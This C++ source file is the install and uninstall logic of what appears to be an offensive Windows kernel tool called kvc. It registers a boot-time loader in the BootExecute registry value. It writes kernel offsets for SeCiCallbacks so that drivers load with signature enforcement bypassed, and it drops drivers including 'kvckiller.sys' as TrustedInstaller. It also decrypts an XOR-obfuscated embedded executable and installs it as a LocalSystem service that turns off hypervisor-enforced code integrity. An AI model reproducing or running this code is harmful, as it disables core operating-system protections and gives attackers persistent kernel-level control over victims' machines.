// ControllerSmss.cpp
// SMSS Boot-Phase Driver Loader - install/uninstall logic
// Writes drivers.ini (UTF-16 LE BOM) and manages BootExecute registry entry

#include "Controller.h"
#include "DSEBypass.h"
#include "SymbolEngine.h"
#include "Utils.h"
#include "common.h"
#include "resource.h"
#include <fstream>
#include <string>

// ============================================================================
// CONSTANTS
// ============================================================================

static constexpr DWORD64 SMSS_CALLBACK_OFFSET = 0x20;

static constexpr DWORD SMSS_IOCTL_READ  = 0x80002048;
static constexpr DWORD SMSS_IOCTL_WRITE = 0x8000204c;

static const wchar_t* SMSS_INI_PATH       = L"C:\\Windows\\drivers.ini";
static const wchar_t* SMSS_SYSTEM32_PATH  = L"C:\\Windows\\System32\\kvc_smss.exe";
static const wchar_t* SMSS_BOOT_EXEC_KEY  = L"SYSTEM\\CurrentControlSet\\Control\\Session Manager";
static const wchar_t* SMSS_BOOT_EXEC_VAL  = L"BootExecute";
static const wchar_t* SMSS_ENTRY_NAME     = L"kvc_smss";
// Standard entry that must always be present
static const wchar_t* SMSS_DEFAULT_ENTRY  = L"autocheck autochk *";

static const wchar_t* HVCI_SVC_EXE_PATH  = L"C:\\Windows\\System32\\HvciShutdownSvc.exe";
static const wchar_t* HVCI_SVC_NAME      = L"HvciShutdownSvc";

// ============================================================================
// HELPERS
// ============================================================================

// Build the NT service path for a driver name (strips/adds .sys, returns
// \SystemRoot\System32\drivers\<name>.sys or the original path if absolute)
static std::wstring BuildDriverImagePath(const std::wstring& nameOrPath) {
    // If it looks like an absolute path, use as-is
    if (nameOrPath.size() >= 3 && nameOrPath[1] == L':') {
        return nameOrPath;
    }
    if (nameOrPath.find(L'\\') != std::wstring::npos) {
        return nameOrPath;
    }

    std::wstring stem = nameOrPath;
    // Strip .sys if present (case-insensitive)
    if (stem.size() > 4) {
        std::wstring ext = stem.substr(stem.size() - 4);
        if (ext[0] == L'.' &&
            (ext[1] == L's' || ext[1] == L'S') &&
            (ext[2] == L'y' || ext[2] == L'Y') &&
            (ext[3] == L's' || ext[3] == L'S')) {
            stem = stem.substr(0, stem.size() - 4);
        }
    }
    return L"\\SystemRoot\\System32\\drivers\\" + stem + L".sys";
}

// Strip .sys extension for service name
static std::wstring BuildServiceName(const std::wstring& nameOrPath) {
    // Extract last component of path
    size_t slash = nameOrPath.find_last_of(L"\\/");
    std::wstring base = (slash != std::wstring::npos) ? nameOrPath.substr(slash + 1) : nameOrPath;

    // Strip .sys
    if (base.size() > 4) {
        std::wstring ext = base.substr(base.size() - 4);
        if (ext[0] == L'.' &&
            (ext[1] == L's' || ext[1] == L'S') &&
            (ext[2] == L'y' || ext[2] == L'Y') &&
            (ext[3] == L's' || ext[3] == L'S')) {
            base = base.substr(0, base.size() - 4);
        }
    }
    return base;
}

// Write a UTF-16 LE file with BOM
static bool WriteUtf16File(const wchar_t* path, const std::wstring& content) {
    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        ERROR(L"Failed to create %s: %lu", path, GetLastError());
        return false;
    }

    // BOM
    const WORD bom = 0xFEFF;
    DWORD written = 0;
    WriteFile(hFile, &bom, 2, &written, nullptr);

    // Content
    if (!content.empty()) {
        WriteFile(hFile, content.c_str(),
                  static_cast<DWORD>(content.size() * sizeof(wchar_t)),
                  &written, nullptr);
    }

    CloseHandle(hFile);
    return true;
}

// Read existing UTF-16 LE file (strips BOM if present).
// Falls back to UTF-8/ASCII widening if no UTF-16 LE BOM is detected,
// so manually edited UTF-8 files don't produce mojibake.
static bool ReadUtf16File(const wchar_t* path, std::wstring& out) {
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER size;
    if (!GetFileSizeEx(hFile, &size) || size.QuadPart < 2) {
        CloseHandle(hFile);
        return false;
    }

    std::vector<BYTE> buf(static_cast<size_t>(size.QuadPart));
    DWORD read = 0;
    ReadFile(hFile, buf.data(), static_cast<DWORD>(buf.size()), &read, nullptr);
    CloseHandle(hFile);

    if (read < 2) return false;

    // UTF-16 LE with BOM
    if (buf[0] == 0xFF && buf[1] == 0xFE) {
        size_t wcharCount = (read - 2) / 2;
        out.assign(reinterpret_cast<const wchar_t*>(buf.data() + 2), wcharCount);
        return true;
    }

    // No UTF-16 LE BOM: treat as UTF-8 (handles both BOM-less UTF-8 and UTF-8 BOM)
    size_t start = 0;
    if (read >= 3 && buf[0] == 0xEF && buf[1] == 0xBB && buf[2] == 0xBF)
        start = 3; // skip UTF-8 BOM

    int wideLen = MultiByteToWideChar(CP_UTF8, 0,
                                      reinterpret_cast<const char*>(buf.data() + start),
                                      static_cast<int>(read - start),
                                      nullptr, 0);
    if (wideLen <= 0) return false;

    out.resize(static_cast<size_t>(wideLen));
    MultiByteToWideChar(CP_UTF8, 0,
                        reinterpret_cast<const char*>(buf.data() + start),
                        static_cast<int>(read - start),
                        out.data(), wideLen);
    return true;
}

// Count existing [DriverN] sections in an INI string
static int CountDriverSections(const std::wstring& ini) {
    int count = 0;
    size_t pos = 0;
    while ((pos = ini.find(L"[Driver", pos)) != std::wstring::npos) {
        // Check that next char after "Driver" is a digit
        size_t idx = pos + 7;
        if (idx < ini.size() && ini[idx] >= L'0' && ini[idx] <= L'9') count++;
        pos++;
    }
    return count;
}

// ============================================================================
// BOOT EXECUTE MANAGEMENT
// ============================================================================

static bool AddBootExecuteEntry() {
    HKEY hKey;
    LONG r = RegOpenKeyExW(HKEY_LOCAL_MACHINE, SMSS_BOOT_EXEC_KEY, 0,
                           KEY_READ | KEY_WRITE, &hKey);
    if (r != ERROR_SUCCESS) {
        ERROR(L"Failed to open Session Manager key: %ld", r);
        return false;
    }

    // Read current REG_MULTI_SZ value
    DWORD type = 0, dataSize = 0;
    RegQueryValueExW(hKey, SMSS_BOOT_EXEC_VAL, nullptr, &type, nullptr, &dataSize);
    if (dataSize == 0) dataSize = sizeof(wchar_t) * 2;

    std::vector<BYTE> buf(dataSize + 64 * sizeof(wchar_t));
    DWORD readSize = static_cast<DWORD>(buf.size());
    r = RegQueryValueExW(hKey, SMSS_BOOT_EXEC_VAL, nullptr, &type,
                         buf.data(), &readSize);
    if (r != ERROR_SUCCESS && r != ERROR_FILE_NOT_FOUND) {
        RegCloseKey(hKey);
        ERROR(L"Failed to read BootExecute: %ld", r);
        return false;
    }

    // Parse MULTI_SZ into list of strings
    std::vector<std::wstring> entries;
    const wchar_t* p = reinterpret_cast<const wchar_t*>(buf.data());
    const wchar_t* end = p + readSize / sizeof(wchar_t);
    while (p < end && *p != L'\0') {
        entries.emplace_back(p);
        p += entries.back().size() + 1;
    }

    // Ensure default entry exists
    bool hasDefault = false;
    bool hasSmss    = false;
    for (const auto& e : entries) {
        if (e == SMSS_DEFAULT_ENTRY) hasDefault = true;
        if (e == SMSS_ENTRY_NAME)    hasSmss    = true;
    }

    if (hasSmss) {
        INFO(L"kvc_smss already registered in BootExecute");
        RegCloseKey(hKey);
        return true;
    }

    if (!hasDefault) entries.insert(entries.begin(), std::wstring(SMSS_DEFAULT_ENTRY));
    entries.emplace_back(SMSS_ENTRY_NAME);

    // Rebuild MULTI_SZ buffer
    std::vector<wchar_t> newBuf;
    for (const auto& e : entries) {
        for (wchar_t c : e) newBuf.push_back(c);
        newBuf.push_back(L'\0');
    }
    newBuf.push_back(L'\0'); // Double-null terminator

    r = RegSetValueExW(hKey, SMSS_BOOT_EXEC_VAL, 0, REG_MULTI_SZ,
                       reinterpret_cast<const BYTE*>(newBuf.data()),
                       static_cast<DWORD>(newBuf.size() * sizeof(wchar_t)));
    RegCloseKey(hKey);

    if (r != ERROR_SUCCESS) {
        ERROR(L"Failed to write BootExecute: %ld", r);
        return false;
    }
    return true;
}

static bool RemoveBootExecuteEntry() {
    HKEY hKey;
    LONG r = RegOpenKeyExW(HKEY_LOCAL_MACHINE, SMSS_BOOT_EXEC_KEY, 0,
                           KEY_READ | KEY_WRITE, &hKey);
    if (r != ERROR_SUCCESS) {
        ERROR(L"Failed to open Session Manager key: %ld", r);
        return false;
    }

    DWORD type = 0, dataSize = 0;
    r = RegQueryValueExW(hKey, SMSS_BOOT_EXEC_VAL, nullptr, &type, nullptr, &dataSize);
    if (r == ERROR_FILE_NOT_FOUND) {
        RegCloseKey(hKey);
        return true; // Nothing to remove
    }
    if (r != ERROR_SUCCESS || dataSize == 0) {
        RegCloseKey(hKey);
        ERROR(L"Failed to query BootExecute size: %ld", r);
        return false;
    }

    std::vector<BYTE> buf(dataSize);
    DWORD readSize = dataSize;
    r = RegQueryValueExW(hKey, SMSS_BOOT_EXEC_VAL, nullptr, &type,
                         buf.data(), &readSize);
    if (r != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        ERROR(L"Failed to read BootExecute: %ld", r);
        return false;
    }

    // Parse and rebuild without kvc_smss entry
    std::vector<std::wstring> entries;
    const wchar_t* p = reinterpret_cast<const wchar_t*>(buf.data());
    const wchar_t* end = p + readSize / sizeof(wchar_t);
    bool found = false;
    while (p < end && *p != L'\0') {
        std::wstring entry(p);
        p += entry.size() + 1;
        if (entry == SMSS_ENTRY_NAME) { found = true; continue; }
        entries.push_back(entry);
    }

    if (!found) {
        INFO(L"kvc_smss not found in BootExecute - nothing to remove");
        RegCloseKey(hKey);
        return true;
    }

    // Rebuild MULTI_SZ
    std::vector<wchar_t> newBuf;
    for (const auto& e : entries) {
        for (wchar_t c : e) newBuf.push_back(c);
        newBuf.push_back(L'\0');
    }
    newBuf.push_back(L'\0');

    r = RegSetValueExW(hKey, SMSS_BOOT_EXEC_VAL, 0, REG_MULTI_SZ,
                       reinterpret_cast<const BYTE*>(newBuf.data()),
                       static_cast<DWORD>(newBuf.size() * sizeof(wchar_t)));
    RegCloseKey(hKey);

    if (r != ERROR_SUCCESS) {
        ERROR(L"Failed to write BootExecute: %ld", r);
        return false;
    }
    return true;
}

// ============================================================================
// PUBLIC API - Controller methods
// ============================================================================

// Extracts HvciShutdownSvc.exe (IDR_DRV2, XOR+LZNT1) from the already-deployed kvc_smss.exe,
// writes it to System32 as HvciShutdownSvc.exe, and registers+starts the service.
// Best-effort: logs warnings and returns on any failure without aborting install.
static void DeployHvciShutdownService() noexcept {
    static constexpr WORD kHvciShutdownSvcRsrcId = 102;
    static constexpr BYTE kXorKey[]  = { 0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C };

    // Load kvc_smss.exe as a data-only image to access its resource section
    HMODULE hSmss = LoadLibraryExW(SMSS_SYSTEM32_PATH, nullptr, LOAD_LIBRARY_AS_DATAFILE);
    if (!hSmss) {
        INFO(L"HvciShutdownSvc: LoadLibraryEx(kvc_smss.exe) failed (%lu)", GetLastError());
        return;
    }

    HRSRC   hRsrc    = FindResourceW(hSmss, MAKEINTRESOURCEW(kHvciShutdownSvcRsrcId), RT_RCDATA);
    DWORD   compSize = hRsrc ? SizeofResource(hSmss, hRsrc) : 0;
    HGLOBAL hGlob    = hRsrc ? LoadResource(hSmss, hRsrc)   : nullptr;
    const BYTE* compData = hGlob ? static_cast<const BYTE*>(LockResource(hGlob)) : nullptr;

    if (!compData || compSize == 0) {
        INFO(L"HvciShutdownSvc: IDR_DRV2 resource missing from kvc_smss.exe");
        FreeLibrary(hSmss);
        return;
    }

    // XOR decrypt into a local buffer
    std::vector<BYTE> decBuf(compData, compData + compSize);
    FreeLibrary(hSmss);
    for (DWORD i = 0; i < compSize; ++i)
        decBuf[i] ^= kXorKey[i % 7];

    // LZNT1 decompress via ntdll!RtlDecompressBuffer
    using RtlDecompress_t = NTSTATUS (WINAPI*)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, PULONG);
    auto pfnDecompress = reinterpret_cast<RtlDecompress_t>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlDecompressBuffer"));
    if (!pfnDecompress) {
        INFO(L"HvciShutdownSvc: RtlDecompressBuffer not found in ntdll.dll");
        return;
    }

    std::vector<BYTE> HvciShutdownSvcBuf(64 * 1024);
    ULONG finalSize = 0;
    NTSTATUS status = pfnDecompress(
        2 /* COMPRESSION_FORMAT_LZNT1 */,
        HvciShutdownSvcBuf.data(), static_cast<ULONG>(HvciShutdownSvcBuf.size()),
        decBuf.data(), static_cast<ULONG>(decBuf.size()),
        &finalSize);
    if (status != 0 || finalSize == 0) {
        INFO(L"HvciShutdownSvc: LZNT1 decompression failed (NTSTATUS 0x%lX)", (ULONG)status);
        return;
    }

    // Write HvciShutdownSvc.exe to System32
    HANDLE hOut = CreateFileW(HVCI_SVC_EXE_PATH, GENERIC_WRITE, 0, nullptr,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hOut == INVALID_HANDLE_VALUE) {
        INFO(L"HvciShutdownSvc: cannot write exe to System32 (%lu)", GetLastError());
        return;
    }
    DWORD written = 0;
    WriteFile(hOut, HvciShutdownSvcBuf.data(), finalSize, &written, nullptr);
    CloseHandle(hOut);
    if (written != finalSize) {
        INFO(L"HvciShutdownSvc: incomplete write (%lu of %lu bytes)", written, finalSize);
        DeleteFileW(HVCI_SVC_EXE_PATH);
        return;
    }
    SUCCESS(L"HvciShutdownSvc.exe written to System32 (%lu bytes)", written);

    // Register as AUTO_START service running as LocalSystem
    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!hScm) {
        INFO(L"HvciShutdownSvc: OpenSCManager failed (%lu)", GetLastError());
        return;
    }

    SC_HANDLE hSvc = CreateServiceW(
        hScm,
        HVCI_SVC_NAME, HVCI_SVC_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,
        HVCI_SVC_EXE_PATH,
        nullptr, nullptr, nullptr,
        nullptr /* LocalSystem */, nullptr);

    if (!hSvc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            SC_HANDLE hExisting = OpenServiceW(hScm, HVCI_SVC_NAME,
                                               SERVICE_QUERY_CONFIG | SERVICE_QUERY_STATUS);
            if (hExisting) {
                SERVICE_STATUS ss{};
                QUERY_SERVICE_CONFIGW* cfg = nullptr;
                DWORD needed = 0;
                QueryServiceConfigW(hExisting, nullptr, 0, &needed);
                std::vector<BYTE> cfgBuf(needed);
                cfg = reinterpret_cast<QUERY_SERVICE_CONFIGW*>(cfgBuf.data());
                bool gotCfg = QueryServiceConfigW(hExisting, cfg, needed, &needed);
                QueryServiceStatus(hExisting, &ss);
                CloseServiceHandle(hExisting);

                const wchar_t* state     = (ss.dwCurrentState == SERVICE_RUNNING) ? L"RUNNING"
                                         : (ss.dwCurrentState == SERVICE_STOPPED) ? L"STOPPED"
                                         : L"OTHER";
                const wchar_t* startType = (gotCfg && cfg->dwStartType == SERVICE_AUTO_START)   ? L"AUTO_START"
                                         : (gotCfg && cfg->dwStartType == SERVICE_DEMAND_START) ? L"DEMAND_START"
                                         : (gotCfg && cfg->dwStartType == SERVICE_DISABLED)     ? L"DISABLED"
                                         : L"OTHER";
                INFO(L"HvciShutdownSvc already registered — state: %s, start: %s (not modified)",
                     state, startType);
            } else {
                INFO(L"HvciShutdownSvc already registered (cannot query status)");
            }
        } else {
            INFO(L"HvciShutdownSvc: CreateService failed (%lu)", err);
        }
        CloseServiceHandle(hScm);
        return;
    }

    // Freshly created — start it immediately
    if (!StartServiceW(hSvc, 0, nullptr) && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING)
        INFO(L"HvciShutdownSvc: StartService failed (%lu)", GetLastError());
    else
        SUCCESS(L"HvciShutdownSvc registered and running");
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
}

bool Controller::InstallSmssDriver(const std::wstring& driverArg, bool usePdb) noexcept {
    INFO(L"Installing SMSS boot-phase driver loader...");

    // --- 0. Extract all embedded components ---
    std::vector<BYTE> kvcSysData, kvckillerData, kvcstrmData, dllData, smssData;
    if (!Utils::ExtractResourceComponents(IDR_MAINICON, kvcSysData, kvckillerData, kvcstrmData, dllData, smssData) || smssData.empty()) {
        ERROR(L"Failed to extract components from resource");
        return false;
    }

    // Helper: returns true if the file at path exists and its bytes match expected.
    auto FileBytesMatch = [](const std::wstring& path, const std::vector<BYTE>& expected) -> bool {
        HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                               nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h == INVALID_HANDLE_VALUE) return false;
        LARGE_INTEGER sz{};
        bool ok = GetFileSizeEx(h, &sz) &&
                  sz.QuadPart == static_cast<LONGLONG>(expected.size());
        if (ok) {
            std::vector<BYTE> buf(expected.size());
            DWORD nRead = 0;
            ok = ReadFile(h, buf.data(), static_cast<DWORD>(expected.size()), &nRead, nullptr) &&
                 nRead == static_cast<DWORD>(expected.size()) &&
                 buf == expected;
        }
        CloseHandle(h);
        return ok;
    };

    // --- 0a. Deploy kvc_smss.exe to System32 if not already present ---
    if (GetFileAttributesW(SMSS_SYSTEM32_PATH) == INVALID_FILE_ATTRIBUTES) {
        HANDLE hFile = CreateFileW(SMSS_SYSTEM32_PATH, GENERIC_WRITE, 0, nullptr,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            ERROR(L"Failed to create %s: %lu", SMSS_SYSTEM32_PATH, GetLastError());
            return false;
        }
        DWORD written = 0;
        WriteFile(hFile, smssData.data(), static_cast<DWORD>(smssData.size()), &written, nullptr);
        CloseHandle(hFile);
        if (written != smssData.size()) {
            ERROR(L"Failed to write kvc_smss.exe to System32 (wrote %lu of %zu bytes)", written, smssData.size());
            DeleteFileW(SMSS_SYSTEM32_PATH);
            return false;
        }
        SUCCESS(L"kvc_smss.exe deployed to System32 (%lu bytes)", written);
    } else {
        INFO(L"kvc_smss.exe already present in System32");
    }

    // --- 0a2. Extract HvciShutdownSvc.exe and register HvciShutdownSvc ---
    // Skip when existing drivers.ini has RestoreHVCI=NO; kvc_smss will clean up on boot.
    {
        std::wstring existingIni;
        bool skipHvci = ReadUtf16File(SMSS_INI_PATH, existingIni) &&
                        existingIni.find(L"RestoreHVCI=NO") != std::wstring::npos;
        if (!skipHvci)
            DeployHvciShutdownService();
    }

    // --- 0b. Deploy kvc.sys, kvckiller.sys and kvcstrm.sys to DriverStore FileRepository ---
    {
        std::wstring driverDir      = GetDriverStorePath();
        std::wstring kvcSysPath     = driverDir + L"\\" + GetDriverFileName();
        std::wstring kvckillerPath  = driverDir + L"\\kvckiller.sys";
        std::wstring kvcstrmPath    = driverDir + L"\\" + GetKvcstrmFileName();

        if (!m_trustedInstaller.CreateDirectoryAsTrustedInstaller(driverDir)) {
            ERROR(L"Failed to create DriverStore directory: %s", driverDir.c_str());
            return false;
        }

        if (!FileBytesMatch(kvcSysPath, kvcSysData)) {
            if (!m_trustedInstaller.WriteFileAsTrustedInstaller(kvcSysPath, kvcSysData) ||
                GetFileAttributesW(kvcSysPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
                ERROR(L"Failed to deploy kvc.sys to DriverStore");
                return false;
            }
            SUCCESS(L"kvc.sys deployed to DriverStore");
        } else {
            INFO(L"kvc.sys already up to date in DriverStore");
        }

        // Deploy kvckiller.sys if present
        if (!kvckillerData.empty()) {
            if (!FileBytesMatch(kvckillerPath, kvckillerData)) {
                if (!m_trustedInstaller.WriteFileAsTrustedInstaller(kvckillerPath, kvckillerData) ||
                    GetFileAttributesW(kvckillerPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
                    ERROR(L"Failed to deploy kvckiller.sys to DriverStore");
                    return false;
                }
                SUCCESS(L"kvckiller.sys deployed to DriverStore");
            } else {
                INFO(L"kvckiller.sys already up to date in DriverStore");
            }
        }

        if (!FileBytesMatch(kvcstrmPath, kvcstrmData)) {
            if (!m_trustedInstaller.WriteFileAsTrustedInstaller(kvcstrmPath, kvcstrmData)) {
                if (GetFileAttributesW(kvcstrmPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
                    ERROR(L"Failed to deploy kvcstrm.sys to DriverStore");
                    return false;
                }
                DEBUG(L"kvcstrm.sys write skipped (file locked by running driver) - existing copy retained");
            } else {
                SUCCESS(L"kvcstrm.sys deployed to DriverStore");
            }
        } else {
            INFO(L"kvcstrm.sys already up to date in DriverStore");
        }
    }

    // --- 1. Resolve driver name and path ---
    std::wstring serviceName = BuildServiceName(driverArg);
    std::wstring imagePath   = BuildDriverImagePath(driverArg);

    INFO(L"Service name : %s", serviceName.c_str());
    INFO(L"Image path   : %s", imagePath.c_str());

    // --- 2. Read or create drivers.ini ---
    std::wstring ini;
    bool fileExists = ReadUtf16File(SMSS_INI_PATH, ini);

    // Build/update [Config] section if missing
    if (ini.find(L"[Config]") == std::wstring::npos) {
        std::wstring config;
        config += L"[Config]\r\n";
        config += L"Execute=YES\r\n";
        config += L"RestoreHVCI=YES\r\n";
        config += L"Verbose=NO\r\n";
        config += L"DriverDevice=\\Device\\kvc\r\n";

        wchar_t ioctlReadBuf[32], ioctlWriteBuf[32];
        _ui64tow_s(SMSS_IOCTL_READ,  ioctlReadBuf,  32, 10);
        _ui64tow_s(SMSS_IOCTL_WRITE, ioctlWriteBuf, 32, 10);
        config += std::wstring(L"IoControlCode_Read=")  + ioctlReadBuf  + L"\r\n";
        config += std::wstring(L"IoControlCode_Write=") + ioctlWriteBuf + L"\r\n";

        if (usePdb) {
            if (!m_dseBypass)
                m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);

            auto kernelInfo = m_dseBypass->GetKernelInfo();
            if (kernelInfo) {
                auto [kernelBase, kernelPath] = *kernelInfo;
                INFO(L"Kernel path  : %s", kernelPath.c_str());

                SymbolEngine symEngine;
                auto offsets = symEngine.GetSymbolOffsets(kernelPath);
                if (offsets) {
                    auto [offSeCi, offZwFlush] = *offsets;
                    INFO(L"Offset SeCiCallbacks : 0x%llX", offSeCi);
                    INFO(L"Offset ZwFlush       : 0x%llX", offZwFlush);

                    wchar_t seciOffBuf[32], cbOffBuf[32], safeOffBuf[32];
                    _ui64tow_s(offSeCi,              seciOffBuf, 32, 10);
                    _ui64tow_s(SMSS_CALLBACK_OFFSET, cbOffBuf,   32, 10);
                    _ui64tow_s(offZwFlush,           safeOffBuf, 32, 10);
                    config += std::wstring(L"Offset_SeCiCallbacks=") + seciOffBuf + L"\r\n";
                    config += std::wstring(L"Offset_Callback=")      + cbOffBuf   + L"\r\n";
                    config += std::wstring(L"Offset_SafeFunction=")  + safeOffBuf + L"\r\n";
                    config += L"OffsetSource=PDB\r\n";
                    INFO(L"PDB offsets resolved and written to drivers.ini");
                } else {
                    INFO(L"PDB lookup failed - boot-time scanner will resolve offsets");
                }
            } else {
                INFO(L"Kernel info unavailable - boot-time scanner will resolve offsets");
            }
        } else {
            INFO(L"Boot-time scanner will resolve kernel offsets (use --pdb to pre-resolve via symbols)");
        }

        config += L"\r\n";
        ini = config + ini;
        fileExists = false; // force full rewrite
    }

    auto appendTemplateSectionIfMissing = [&](const wchar_t* header, const std::wstring& section) {
        if (ini.find(header) != std::wstring::npos) {
            return;
        }

        if (!ini.empty() && ini.size() >= 2 && ini.substr(ini.size() - 2) != L"\r\n") {
            ini += L"\r\n";
        }

        ini += section;
    };

    // Check if this driver is already registered
    std::wstring searchKey = L"ServiceName=" + serviceName;
    if (ini.find(searchKey) != std::wstring::npos) {
        INFO(L"Driver '%s' is already registered in drivers.ini", serviceName.c_str());
    } else {
        // Append new [DriverN] section
        int driverNum = CountDriverSections(ini);
        wchar_t numBuf[16];
        _itow_s(driverNum, numBuf, 10);

        std::wstring section;
        section += L"[Driver" + std::wstring(numBuf) + L"]\r\n";
        section += L"Action=LOAD\r\n";
        section += L"AutoPatch=YES\r\n";
        section += L"ServiceName=" + serviceName + L"\r\n";
        section += L"ImagePath=" + imagePath + L"\r\n";
        section += L"DriverType=1\r\n";
        section += L"StartType=1\r\n";
        section += L"\r\n";

        ini += section;
        SUCCESS(L"Driver '%s' added to drivers.ini", serviceName.c_str());
    }

    appendTemplateSectionIfMissing(
        L"[RenameX]",
        L"[RenameX]\r\n"
        L"; Action=RENAME\r\n"
        L"; SourcePath=\r\n"
        L"; TargetPath=\r\n"
        L"; ReplaceIfExists=NO\r\n"
        L"\r\n");

    appendTemplateSectionIfMissing(
        L"[DeleteX]",
        L"[DeleteX]\r\n"
        L"; Action=DELETE\r\n"
        L"; DeletePath=\r\n"
        L"; RecursiveDelete=NO\r\n"
        L"\r\n");

    // --- 4. Write drivers.ini ---
    if (!WriteUtf16File(SMSS_INI_PATH, ini)) {
        ERROR(L"Failed to write %s", SMSS_INI_PATH);
        return false;
    }
    SUCCESS(L"drivers.ini written to %s", SMSS_INI_PATH);

    // --- 5. Register kvc_smss in BootExecute ---
    if (!AddBootExecuteEntry()) {
        ERROR(L"Failed to register kvc_smss in BootExecute");
        return false;
    }
    SUCCESS(L"kvc_smss registered in BootExecute");
    INFO(L"Driver will be loaded at next boot before Winlogon");
    return true;
}

bool Controller::UninstallSmss() noexcept {
    INFO(L"Removing SMSS boot-phase driver loader...");
    bool ok = true;

    // Remove BootExecute entry
    if (RemoveBootExecuteEntry()) {
        SUCCESS(L"kvc_smss removed from BootExecute");
    } else {
        ERROR(L"Failed to remove kvc_smss from BootExecute");
        ok = false;
    }

    // Delete drivers.ini
    if (GetFileAttributesW(SMSS_INI_PATH) != INVALID_FILE_ATTRIBUTES) {
        if (DeleteFileW(SMSS_INI_PATH)) {
            SUCCESS(L"drivers.ini deleted");
        } else {
            ERROR(L"Failed to delete drivers.ini: %lu", GetLastError());
            ok = false;
        }
    } else {
        INFO(L"drivers.ini not found - nothing to delete");
    }

    // Remove kvc_smss.exe from System32
    if (GetFileAttributesW(SMSS_SYSTEM32_PATH) != INVALID_FILE_ATTRIBUTES) {
        if (DeleteFileW(SMSS_SYSTEM32_PATH)) {
            SUCCESS(L"kvc_smss.exe removed from System32");
        } else {
            ERROR(L"Failed to delete kvc_smss.exe: %lu", GetLastError());
            ok = false;
        }
    } else {
        INFO(L"kvc_smss.exe not found in System32 - nothing to delete");
    }

    // Remove HvciShutdownSvc service and executable
    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (hScm) {
        SC_HANDLE hSvc = OpenServiceW(hScm, HVCI_SVC_NAME,
                                      SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
        if (hSvc) {
            SERVICE_STATUS ss{};
            ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
            // Re-query: fast services may already be STOPPED before notify registers
            QueryServiceStatus(hSvc, &ss);
            if (ss.dwCurrentState != SERVICE_STOPPED) {
                HANDLE hEvent = CreateEventW(nullptr, FALSE, FALSE, nullptr);
                if (hEvent) {
                    SERVICE_NOTIFY sn{};
                    sn.dwVersion         = SERVICE_NOTIFY_STATUS_CHANGE;
                    sn.pfnNotifyCallback = [](PVOID ctx) {
                        SetEvent(reinterpret_cast<HANDLE>(
                            static_cast<PSERVICE_NOTIFY>(ctx)->pContext));
                    };
                    sn.pContext = hEvent;
                    if (NotifyServiceStatusChange(hSvc, SERVICE_NOTIFY_STOPPED, &sn) == ERROR_SUCCESS) {
                        DWORD wr;
                        do { wr = WaitForSingleObjectEx(hEvent, 5000, TRUE); }
                        while (wr == WAIT_IO_COMPLETION);
                    }
                    CloseHandle(hEvent);
                }
            }
            if (DeleteService(hSvc))
                SUCCESS(L"HvciShutdownSvc service removed");
            else
                INFO(L"HvciShutdownSvc: DeleteService failed (%lu)", GetLastError());
            CloseServiceHandle(hSvc);
        }
        CloseServiceHandle(hScm);
    }
    if (GetFileAttributesW(HVCI_SVC_EXE_PATH) != INVALID_FILE_ATTRIBUTES) {
        if (DeleteFileW(HVCI_SVC_EXE_PATH)) {
            SUCCESS(L"HvciShutdownSvc.exe removed from System32");
            // Restore Enabled=1 only if it was explicitly set to 0 by DoShutdownAction
            static const wchar_t* kHvciKey =
                L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity";
            HKEY hk = nullptr;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, kHvciKey, 0, KEY_READ | KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
                DWORD val = 0, sz = sizeof(val), type = 0;
                LSTATUS qr = RegQueryValueExW(hk, L"Enabled", nullptr, &type,
                                              reinterpret_cast<BYTE*>(&val), &sz);
                if (qr == ERROR_SUCCESS && type == REG_DWORD && val == 0) {
                    DWORD one = 1;
                    if (RegSetValueExW(hk, L"Enabled", 0, REG_DWORD,
                                      reinterpret_cast<const BYTE*>(&one), sizeof(one)) == ERROR_SUCCESS)
                        SUCCESS(L"HypervisorEnforcedCodeIntegrity restored (Enabled=1)");
                }
                RegCloseKey(hk);
            }
        } else {
            INFO(L"HvciShutdownSvc: cannot delete exe (%lu)", GetLastError());
        }
    }

    return ok;
}
